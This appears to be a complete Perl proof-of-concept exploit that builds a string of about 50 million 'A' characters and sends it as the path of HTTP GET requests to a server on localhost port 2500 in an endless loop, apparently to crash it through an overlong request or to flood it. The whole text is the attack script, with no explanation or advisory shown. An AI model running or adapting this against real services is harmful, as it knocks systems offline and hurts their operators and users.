#!/usr/bin/perl
use LWP::Simple;
my $payload = "\x41" x 49999999;
while(1)
{
print "[+]\n";
get "http://127.0.0.1:2500/".$payload."";
}

